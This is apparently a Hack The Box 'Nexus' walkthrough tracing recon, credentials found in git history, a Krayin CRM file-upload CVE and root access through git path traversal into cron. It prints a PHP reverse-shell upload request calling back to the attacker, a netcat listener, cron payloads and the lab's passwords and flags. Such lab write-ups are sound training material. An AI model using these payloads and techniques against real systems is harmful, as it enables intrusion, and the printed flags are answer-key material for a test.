<div align="center">

# 🎯 HTB — Nexus — Walkthrought by Amaira Safwen .

**Easy · Linux · EU Machines 3**

![Status](https://img.shields.io/badge/status-done-green)
![Difficulty](https://img.shields.io/badge/difficulty-easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![XP](https://img.shields.io/badge/XP-450-orange)

</div>

---

## 📋 Machine Info

| Field | Value |
|---|---|
| **Target IP** | `10.129.89.224` |
| **Hostname** | `nexus.htb` |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Released** | 23 June 2026 |
| **Status** | ⬜ Not Started &nbsp;·&nbsp; 🟨 In Progress &nbsp;·&nbsp; ✅ Rooted |

---

## 📑 Table of Contents

- [1. Reconnaissance](#1-reconnaissance)
- [2. Task Answers](#2-task-answers)
  - [Task 1 — Open TCP Ports](#task-1--open-tcp-ports)
  - [Task 2 — Hiring Manager Email](#task-2--hiring-manager-email)
  - [Task 3 — Git Subdomain](#task-3--git-subdomain)
  - [Task 4 — DB_PASSWORD](#task-4--db_password)
  - [Task 5 — Krayin CRM Version](#task-5--krayin-crm-version)
- [3. Initial Foothold](#3-initial-foothold)
- [4. Task 6 — User Flag](#task-6--user-flag-jones)
- [5. Privilege Escalation](#5-privilege-escalation)
- [6. Task 7 — Root Flag](#task-7--root-flag)
- [7. Summary & Lessons Learned](#7-summary--lessons-learned)
- [8. Tools Used](#8-tools-used)

---

## 1. Reconnaissance

### 🔎 Port Scan

```bash
nmap -sT  10.129.89.224
```

<details>
<summary><strong>📄 Raw Output</strong> (click to expand)</summary>

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

</details>

> **📝 My Explanation:**

We were asked to determine how many TCP ports are open on the target machine. As beginners, whenever we hear the word “ports,” one of the first tools that comes to mind is Nmap, since it is commonly used to scan a target and identify open ports and the services running on them.

That’s why we used the Nmap command shown above. The scan allows us to examine the target’s TCP ports and determine which ones are accessible. Once the scan is complete, we can review the results and count the number of open TCP ports on the target.




---

### 🌐 Virtual Host / Subdomain Enumeration

```bash
echo "10.129.89.224 nexus.htb" | sudo tee -a /etc/hosts

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.nexus.htb" -u http://nexus.htb 
```

<details>
<summary><strong>📄 Raw Output</strong></summary>

```
<subdomains discovered>
```

</details>

> **📝 My Explanation:**

> After scanning the target, we found only two open TCP ports: SSH and HTTP. We first tested whether SSH allowed passwordless access, but unfortunately, that approach did not work. Therefore, we decided to focus our attention on the HTTP service, which could potentially serve as our entry point for exploiting the lab target.

We started by accessing the target IP address directly through the browser. However, instead of getting the expected web page, we received a 302 HTTP response, indicating that the server was redirecting our request.

To determine where the server was redirecting us, we used curl to inspect the HTTP response and follow the redirection. This revealed that our requests were being redirected to:

http://nexus.htb/

The problem was that nexus.htb did not have a corresponding DNS record, so our machine could not resolve the domain name. To solve this, we manually added an entry mapping the target IP address to nexus.htb in the /etc/hosts file. This allowed our system to resolve the domain locally and access the web application.

Once we were able to access the website, we proceeded with further enumeration using FFUF, a tool commonly used for discovering hidden directories, endpoints, virtual hosts, and subdomains.

During this enumeration, we discovered another subdomain:

git.nexus.htb

This was an interesting finding because Git-related services can sometimes expose sensitive information, such as source code, configuration files, credentials, API keys, or other development artifacts.

Even though discovering additional subdomains was not explicitly required by the task, as a penetration tester, it is important to remain curious and investigate potentially interesting attack surfaces. Therefore, i decided to explore git.nexus.htb further to understand what service was running there and whether it could provide useful information for progressing through the lab.



---

## 2. Task Answers

### Task 1 — Open TCP Ports
**❓ Question:** How many open TCP ports are listening on Nexus?
**✅ Answer:** `2`

> **📝 My Explanation:**
> the nmap scan showed only 2 TCP ports 22(ssh) and 80(http) . 

---

### Task 2 — Hiring Manager Email
**❓ Question:** What is the hiring manager's full email address?
**✅ Answer:** `j.matthew@nexus.htb`

> **📝 My Explanation:**
> After accessing the web app, we just scroll down and try the website (as a normal user) and we got this information in a job application modal.
---

### Task 3 — Git Subdomain
**❓ Question:** What is the name of the additional subdomain hosting the Git service?
**✅ Answer:** `git`

> **📝 My Explanation:**
> We got this after enummerating subdomains of http://nexus.htb

---

### Task 4 — DB_PASSWORD
**❓ Question:** What is the DB_PASSWORD discovered while enumerating the exposed repository?
**✅ Answer:** `N27xh!!2ucY04`

> **📝 My Explanation:**
>
This task was a little tricky, so I’ll explain how I approached it and eventually found the answer.

As I mentioned during the reconnaissance phase, I discovered the git.nexus.htb subdomain. This immediately caught my attention and made me more curious about what was running there. I added git.nexus.htb to my /etc/hosts file and accessed the subdomain directly.

Once inside, I discovered a Git repository named krayin-docker-setup. I started exploring the repository to see whether it contained anything useful. One of the first things I noticed was a .env file, which is always worth checking because environment files can sometimes contain sensitive information such as credentials, API keys, database configuration, and other secrets.

However, the .env file did not contain the information I was looking for.

While exploring the repository, I noticed something interesting: it only had two commits. This immediately raised a question in my mind: Why are there only two commits?

Considering that the website appeared to be relatively large and complex, it seemed unlikely that the entire project had been developed with only two commits. If the repository had been actively used throughout the development process, I would normally expect to see a much longer commit history.

So, instead of looking only at the current state of the repository, I decided to investigate its history. I went back and examined the first commit.

And that's where things became interesting.

The sensitive information that was no longer visible in the current version of the repository had apparently been removed or hidden in a later commit. However, removing sensitive information from the latest version does not necessarily mean that it has disappeared from the Git history.

As the saying goes: "History never forgets."

By inspecting the previous commit, I was able to find the information that had been hidden from the current version of the repository.

This was a good reminder that during a penetration test, it is not enough to inspect only what is currently exposed. Version control history can sometimes reveal information that developers thought they had permanently removed.


 
### Task 5 — Krayin CRM Version
**❓ Question:** What version of Krayin CRM is running on the billing subdomain?
**✅ Answer:** 2.2.0

> **📝 My Explanation:**
> 
The Git repository turned out to be a significant source of information and, from a security perspective, a major operational mistake. It exposed several pieces of sensitive information, including credentials, software versions, and deployment-related configuration.

While reviewing the repository, I focused particularly on the Docker Compose configuration. I noticed that the application image was configured to use the latest tag rather than a specific version. At first glance, this might seem convenient from a deployment perspective, but from a security and reproducibility standpoint, it introduces ambiguity: the exact version running at a particular point in time cannot be determined solely from the configuration.

I then correlated this information with the application's deployment timeline. The website had been deployed in April 2026, so I investigated what version of the application was considered the latest around that period. By researching the project's release history, I determined that version 2.2.0 was the latest release at that time.

This allowed me to establish a likely version of the application running on the target without relying solely on the current latest tag.

This is a good example of why penetration testing is not simply about running automated tools and collecting their output. The important part is connecting seemingly unrelated pieces of information: repository configuration, deployment dates, release history, and application behavior. By correlating these findings, I was able to accurately narrow down the software version and continue the assessment with a much better understanding of the target's attack surface.

---

## 3. Initial Foothold

**🛠️ Vulnerability Used:**
> CVE-2026-38526


> **📝 My Explanation:**

At this stage, the assessment became much more straightforward because we had already identified the software and narrowed down the version running on the target: Krayin CRM 2.2.0.

With the exact version identified, the next logical step was to determine whether it was affected by any publicly known vulnerabilities. Rather than blindly searching for vulnerabilities across the entire application, I narrowed the research scope to the specific product and version.

I searched for:

Krayin CRM 2.2.0 CVE

This quickly revealed publicly documented vulnerabilities associated with the identified version. This demonstrates the importance of accurate software version identification during a penetration test: once the technology stack and version are known, vulnerability research becomes significantly more targeted and efficient.

From there, the next step was to validate whether the identified vulnerability was actually applicable to the target and determine its potential impact, rather than assuming that the existence of a CVE automatically meant the target was exploitable.

---






# Exploitation phase: CVE-2026-38526 : 

After identifying the target CVE, I moved into the exploitation phase. A quick enumeration pass revealed that the Krayin CRM admin dashboard is hosted on a separate virtual host, billing.nexus.htb, rather than the main domain.

Setup: Add an entry for billing.nexus.htb in /etc/hosts, then authenticate to the dashboard using credentials recovered earlier from the exposed Git repository:

```credentials
j.matthew@nexus.htb
N27xh!!2ucY04
```
Intercepting the upload request: With Burp Suite's proxy pointed at the target, I logged in and navigated to the Mail section, which uses the same TinyMCE-based upload handler that CVE-2026-38526 targets. I intercepted the file-attachment request and rewrote it to hit the vulnerable endpoint directly, uploading a PHP reverse shell disguised with an image/png content type to slip past the (nonexistent) MIME validation:


```request
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
X-XSRF-TOKEN: ######## KEEP THE SAME TOKEN FROM YOUR PREVIOUS REQUEST IN BURPSUITE ########
Cookie: XSRF-TOKEN= ######## KEEP THE SAME TOKEN FROM YOUR PREVIOUS REQUEST IN BURPSUITE ########
Content-Type: multipart/form-data; boundary=----boundary
Content-Length: <recalculate>
Connection: keep-alive

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png


<?php
$ip = 'YOUR MACHINE IP (if using vpn to connect to the vpn then just use tun0 ip :) )';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
------boundary--
```
Note: the blank line between each part's headers and its content is required by the multipart spec, without it Laravel silently fails to parse the file and returns an empty response.

Locating the uploaded shell: Forwarding the request returns a JSON response containing the file's public path, complete with a randomly generated filename hash this confirms the upload succeeded and tells us exactly where to trigger it:

```location
{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/cdd5fd0ccb7cf7e7f47476d0d733a330.php"}
```

Catching the shell: Start a listener on the attacking machine before triggering the payload:

```bash
nc -lvnp 4444
```
Then request the uploaded file directly, this executes the PHP payload server-side and fires the reverse connection:

http://billing.nexus.htb/storage/tinymce/cdd5fd0ccb7cf7e7f47476d0d733a330.php
NB: cdd5fd0ccb7cf7e7f47476d0d733a330 is the hash i got from the location. 

Result: the netcat listener catches an interactive /bin/sh shell running as the web server user, confirming remote code execution via the unrestricted file upload in Krayin CRM 2.2.x's TinyMCE handler.


## Task 6 — User Password (jones)

**❓ Question:** What is the password for jones discovered during post-exploitation?
 
**🧭 password of `jones`:**
> _Describe lateral movement — reused creds, SUID binary, config file, cron job, sudo rights, etc._

```bash
cat /home/jones/user.txt
```

**✅ Answer:** : y27xb3ha!!74GbR

> **📝 My Explanation:**

Since www-data is the account running the web application, I started looking through the application's files for configuration files and potentially sensitive information.

The Krayin CRM installation was located at:
```path
/var/www/krayin
```

I listed the files and noticed a .env file: 

```path
ls -la /var/www/krayin
```

So I checked it:

```bash 
cat /var/www/krayin/.env

```
Among the configuration values, I found:

```bash 
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```


At first, DB_PASSWORD looked like it was simply the database password. However, the important part was to test whether the credential was reused elsewhere.


``` bash
su - jones
```
When prompted for the password, I entered:
```creds
y27xb3ha!!74GbR
```
The login succeeded.

I then confirmed that I had switched users:
```bash
whoami
```
Output:


```cred
jones

Therefore, the password for jones was:
y27xb3ha!!74GbR
```




## the User flag : 
**✅ Answer:** : a21426bb47c4b86dce2cdf48851c4dd6

> **📝 My Explanation:**

after getting the password of jones, i tried to connect with ssh using: 
```bash
ssh jones@TARGET_IP
```
and i used the password from before. the rest is a piece of cake where i just used these 2 commands: 
```bash
ls
cat user.txt
```


#TASK 9 

**✅ Answer:** : gitea-template-sync.service

> **📝 My Explanation:**
now i need just to list timers using:
 ```bash
systemctl list-timers --all
```

and the rest is a piece of cake where i need to identify which service is used to trigger the template synchronization. in this case it was 

```service
 gitea-template-sync.service
```


##  Root Flag

**❓ Question:** Submit the flag located in the root user's home directory.


> **📝 My Explanation:**


 (this was the hardest task in this lab (at least for me. i really struggled to get a starting point.) ) 


After obtaining the `jones` account, I started enumerating the system for possible privilege-escalation vectors.

One of the first things I checked was the systemd timers:

```bash
systemctl list-timers --all
```

Among the timers, I found an interesting custom timer:

```text
gitea-template-sync.timer
```

This timer triggered:

```text
gitea-template-sync.service
```

I then inspected the service:

```bash
systemctl cat gitea-template-sync.service
```

The important part was:

```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

This immediately stood out because the synchronization script was being executed as **root**.

I then inspected the script:

```bash
cat /etc/gitea/template-sync.py
```

The script queried Gitea for repositories marked as templates and then processed every file in the Git tree.

The interesting part was the way the destination path was constructed:

```python
target = os.path.join(stage_path, filepath)
```

There was no validation or sanitization of `filepath`.

At first, this might not look particularly dangerous because normal Git repositories generally contain normal relative paths. However, the script was trusting the output of:

```python
git ls-tree -r HEAD
```

This meant that if I could create a Git tree containing a malicious path such as:

```text
../../../../../etc/cron.d/nexus
```

the Python script would resolve that path outside the intended staging directory.

### Exploiting the Git Path Traversal

I first verified that Git itself would allow me to construct a tree containing a `..` entry.

Using `git mktree`, I manually created tree objects instead of relying on the normal Git working-tree/index mechanisms.

For example:

```bash
printf '100644 blob <BLOB_HASH>\t..\n' | git mktree
```

This produced a valid tree object.

I then nested multiple `..` tree entries to construct a path that escaped:

```text
/home/git/template-staging/jones/test-template/
```

and eventually reached:

```text
/etc/cron.d/
```

The important discovery was confirmed in the synchronization log:

```text
synced: ../../../../../etc/cron.d/nexus
```

This proved that the root-owned synchronization service was following the path traversal and writing files outside its intended directory.

### Turning the File Write into Root Code Execution

Since `/etc/cron.d/` contains cron configuration files executed by the system's cron daemon, I used the arbitrary root file write to create a cron job.

I initially tested the technique with:

```text
* * * * * root id > /tmp/root_id 2>&1
```

After waiting for cron to execute, the resulting file contained:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed that I had achieved **root command execution**.

At this point, the privilege escalation path was:

```text
jones
  │
  ▼
Gitea template repository
  │
  ▼
Malicious Git tree
  │
  ▼
Path traversal (../)
  │
  ▼
Root-owned template-sync service
  │
  ▼
Arbitrary file write
  │
  ▼
/etc/cron.d/nexus
  │
  ▼
Cron
  │
  ▼
root command execution
```

Finally, I modified the cron payload to read the actual root flag:

```text
* * * * * root cat /root/root.txt > /tmp/nexus_flag 2>&1
```

After the cron job executed, I read the resulting file:

```bash
cat /tmp/nexus_flag
```

This returned the root flag.

### Why This Was the Hardest Part

This was by far the most difficult part of the machine for me.

Unlike a typical easy Linux privilege-escalation path, there was no immediately obvious:

* `sudo` misconfiguration
* SUID binary
* writable systemd service
* writable cron script
* obvious credentials
* vulnerable kernel

The vulnerability was hidden inside the interaction between **Gitea, Git tree objects, a custom Python synchronization script, systemd, and cron**.

The key was not simply discovering that the synchronization service ran as root. The important part was understanding exactly how the service processed Git paths:

```python
target = os.path.join(stage_path, filepath)
```

Once I realized that `filepath` was trusted, I started investigating whether I could create a Git object whose tree path contained `..`.

Normal Git commands were not sufficient for this because they sanitize paths in the working tree. I therefore had to manually construct Git tree objects using:

```bash
git mktree
git commit-tree
```

This allowed me to create a repository state containing the malicious traversal path.

The final exploitation chain was therefore:

> **Git tree path traversal → root-owned arbitrary file write → `/etc/cron.d` injection → root command execution → `/root/root.txt`**

This was a great lesson in why custom automation around Git can introduce serious security vulnerabilities. Git itself was not the vulnerable component; the vulnerability came from trusting Git-controlled file paths inside a privileged script without validating where those paths could resolve.

---

## 7. Task 7 — Root Flag

**❓ Question:** Submit the flag located in the root user's home directory.

**✅ Answer:** ` 5bf032d30fea834e56b378a46fef364f `

> **📝 My Explanation:**

After obtaining root command execution through the vulnerable `gitea-template-sync` process and the cron job, I was finally able to access files inside `/root`.

The root flag was located at:

```text
/root/root.txt
```

I used the root cron execution to read the file and write its contents to a location accessible by `jones`.

The final result confirmed that the machine had been fully compromised and that I had successfully escalated from the initial `www-data` foothold to `jones`, and finally to `root`.

The complete privilege-escalation chain was:

```text
www-data
   │
   │  Credential reuse from Krayin .env
   ▼
jones
   │
   │  Gitea template repository
   ▼
Malicious Git tree
   │
   │  ../ path traversal
   ▼
Root-owned template-sync service
   │
   │  Arbitrary file write
   ▼
/etc/cron.d/nexus
   │
   │  Cron executes as root
   ▼
root
   │
   ▼
/root/root.txt
```

This final step was significantly harder than the earlier stages because it required chaining together several individually subtle findings rather than exploiting a single obvious vulnerability.

---

<div align="center">

📌 **Official Lab Url:** https://app.hackthebox.com/machines/Nexus 

</div>
